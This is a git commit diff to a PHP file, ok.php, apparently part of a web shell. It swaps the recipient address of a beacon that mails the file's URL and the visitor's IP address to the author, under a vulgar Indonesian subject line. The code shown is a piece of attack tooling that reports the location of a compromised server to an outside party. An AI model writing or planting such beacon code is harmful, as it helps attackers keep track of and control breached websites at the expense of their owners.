f51d6a1bb6581e453135bcaf79f14857b168cc1c
tigerxcode29 <168910474+tigerxcode29@users.noreply.github.com>
2024-11-18 00:55:45 +0700

    Update ok.php

--- ok.php
+++ ok.php
@@ -1327,7 +1327,7 @@ return $izin;
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'tigerxcode@proton.me';
+$tujuanmail = 'tigerxcode@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($tujuanmail, "KONTOL BENGKAK", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
